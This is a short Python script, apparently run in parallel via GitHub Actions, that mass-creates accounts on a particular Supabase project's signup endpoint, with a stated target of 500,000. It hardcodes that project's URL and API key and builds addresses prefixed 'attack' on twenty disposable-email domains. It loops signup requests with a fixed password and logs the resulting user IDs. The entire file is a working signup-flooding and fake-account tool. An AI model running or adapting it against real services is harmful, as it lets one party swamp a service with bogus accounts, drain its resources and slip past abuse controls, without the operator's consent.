#!/usr/bin/env python3
"""Account creator for GitHub Actions - Target: 500k accounts"""
import os
import requests
import uuid
import random
import time

SUPABASE_URL = "https://tymnumjtbxompjabjnez.supabase.co"
SUPABASE_KEY = "sb_publishable_P8XnfSscnYnv6TvIN9C2MQ_AcmNQ0eK"

DOMAINS = [
    "yopmail.com", "mailinator.com", "tempmail.com", "guerrillamail.com",
    "throwaway.email", "maildrop.cc", "fakeinbox.com", "temp-mail.org",
    "sharklasers.com", "grr.la", "pokemail.net", "spam4.me",
    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
    "incognitomail.com", "mohmal.com", "getairmail.com", "10minutemail.com"
]

def create_account():
    email = f"attack{uuid.uuid4().hex[:10]}@{random.choice(DOMAINS)}"
    try:
        r = requests.post(
            f"{SUPABASE_URL}/auth/v1/signup",
            headers={"apikey": SUPABASE_KEY, "Content-Type": "application/json"},
            json={"email": email, "password": "AuditTest123!"},
            timeout=30
        )
        if r.status_code == 200:
            uid = r.json().get("user", {}).get("id")
            return email, uid
        print(f"  {r.status_code}")
    except Exception as e:
        print(f"  Error: {e}")
    return None, None

def main():
    instance = os.environ.get("GITHUB_RUN_ID", "local")
    job = os.environ.get("INSTANCE", "1")
    print(f"Job {job} starting (Run: {instance})...")
    
    created = []
    # Try 10 accounts per job
    for i in range(10):
        email, uid = create_account()
        if email:
            created.append((email, uid))
            print(f"[{job}] OK: {email}")
        time.sleep(0.5)
    
    # Save results
    output_file = f"accounts_{job}.txt"
    with open(output_file, "w") as f:
        for email, uid in created:
            f.write(f"{email},{uid}\n")
    
    print(f"\n[{job}] Created {len(created)} accounts")

if __name__ == "__main__":
    main()
